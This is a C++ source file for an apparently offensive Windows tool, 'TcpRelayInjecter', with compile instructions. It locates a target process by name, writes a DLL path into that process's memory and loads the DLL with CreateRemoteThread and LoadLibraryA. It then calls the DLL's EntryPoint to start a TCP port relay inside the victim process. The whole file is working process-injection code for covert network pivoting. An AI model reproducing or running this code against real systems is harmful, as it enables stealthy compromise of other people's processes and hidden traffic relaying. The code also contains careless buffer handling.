/*
Author: @Arno0x0x (https://twitter.com/Arno0x0x)

====== To create an x86 (32 bits) EXE:
	1/ Run the following bat file:
		"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars32.bat"
	2/ Then compile it using
		c:\> cl.exe TcpRelayInjecter.cpp /o TcpRelayInjecter_x86.exe
		
====== To create an x64 (64 bits) EXE:
	1/ Run the following bat file:
		"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
	2/ Then compile it using
		c:\> cl.exe TcpRelayInjecter.cpp /o TcpRelayInjecter_x64.exe
		
*/

#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

//----------------------------------------------------------------------------------------------------------------------------------
DWORD GetProcessIdByName(char* processName)
{
	DWORD pid = 0;
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, processName) == 0)
            {  
                pid = entry.th32ProcessID;
				break;
            }
        }
		CloseHandle(snapshot);
    }
	
	return pid;
}

//----------------------------------------------------------------------------------------------------------------------------------
BOOL RemoteLibraryFunction( HANDLE hProcess, LPCSTR lpModuleName, LPCSTR lpProcName, LPVOID lpParameters, SIZE_T dwParamSize, PVOID *ppReturn )
{
	LPVOID lpRemoteParams = NULL;

	LPVOID lpFunctionAddress = GetProcAddress(GetModuleHandleA(lpModuleName), lpProcName);
	if( !lpFunctionAddress ) lpFunctionAddress = GetProcAddress(LoadLibraryA(lpModuleName), lpProcName);
	if( !lpFunctionAddress ) {
		printf("[ERROR] GetProcAddress failed with error number %d\n",GetLastError());
		goto ErrorHandler;
	}

	if( lpParameters )
	{
		lpRemoteParams = VirtualAllocEx( hProcess, NULL, dwParamSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !lpRemoteParams ) goto ErrorHandler;

		SIZE_T dwBytesWritten = 0;
		BOOL result = WriteProcessMemory( hProcess, lpRemoteParams, lpParameters, dwParamSize, &dwBytesWritten);
		if( !result || dwBytesWritten < 1 ) {
			printf("[ERROR] WriteProcessMemory failed with error number %d\n",GetLastError());
			goto ErrorHandler;
		} 
	}

	HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpFunctionAddress, lpRemoteParams, NULL, NULL );
	if( !hThread ) {
		printf("[ERROR] CreateRemoteThread failed with error number %d\n",GetLastError());
		goto ErrorHandler;
	}
	
	return TRUE;

ErrorHandler:
	if( lpRemoteParams ) VirtualFreeEx( hProcess, lpRemoteParams, dwParamSize, MEM_RELEASE );
	return FALSE;
}

//----------------------------------------------------------------------------------------------------------------------------------
//																MAIN
//----------------------------------------------------------------------------------------------------------------------------------
int main(int argc, char* argv[])
{
	//------------------------------------------
	// Check that we have enough arguments
	if (argc < 4) {
		printf("[ERROR] Missing arguments\n");
		printf("Usage:\n%s <target_process_name> <source_port> <dest_port> [dest_IP]",argv[0]);
		return -1;
	}

	//------------------------------------------
	// Prepare parameters for the injected DLL method that will be called
	char parameters[500];
	sprintf(parameters,"%s,%s",argv[2],argv[3]);
	if (argc == 5) {
		sprintf(parameters,"%s,%s",parameters,argv[4]);
	}
	
	//------------------------------------------
	// Retrieve the process ID based on its name
	int processID = GetProcessIdByName(argv[1]);
	if (processID == 0) {
		printf("[ERROR] The specified process couldn't be found.\n");
		return -1;
	}
	
	//------------------------------------------
	// Get process handle based on the process ID.
	//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	if (hProcess == NULL) {
		printf("[ERROR] Could not open the specified process. Error %d\n",GetLastError());
		return -1;
	}

	//------------------------------------------
	// The TCPRelay.dll must be in the same directory as the TcpRelayInjecter.exe
	// Get the full DLL path for this DLL
    char dllPath[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, dllPath);
	
	//------------------------------------------
	// Check if the target process is 32 or 64 bits
	BOOL bIsWow64 = FALSE;
	IsWow64Process(hProcess,&bIsWow64);
	
	if (bIsWow64) {
		printf("[INFO] Target process %s is 32 bits\n",argv[1]);
		strcat_s(dllPath, "\\TcpRelay_x86.dll");
	}
	else {
		printf("[INFO] Target process %s is 64 bits\n",argv[1]);
		strcat_s(dllPath, "\\TcpRelay_x64.dll");
	}
	printf("[INFO] Injecting %s into process %s with process ID %d\n",dllPath, argv[1],processID);

	//------------------------------------------
	// Load the .Net DLL into the remote process
	BOOL status = FALSE;
	PVOID lpReturn = NULL;
	status = RemoteLibraryFunction( hProcess, "kernel32.dll", "LoadLibraryA", dllPath, strlen(dllPath), &lpReturn );
	if (!status) {
		printf("[ERROR] Calling Kernel32.LoadLibraryA - Could not load the DLL into the remote process");
		return -1;
	}
	
	//------------------------------------------
	// Call the EntryPoint method of our injected DLL
	lpReturn = NULL;
	status = FALSE;
	status = RemoteLibraryFunction( hProcess, dllPath, "EntryPoint", parameters, strlen(parameters), &lpReturn );
	if (!status) {
		printf("[ERROR] Calling %s.EntryPoint - Could not call the method (is it marked as exported in the DLL?)", dllPath);
		return -1;
	}
	
	printf("[INFO] Remote process sucessfully injected :-) !");
	
	// Close the handle to the process: we've already injected the DLL.
	CloseHandle(hProcess);

	return 0;
}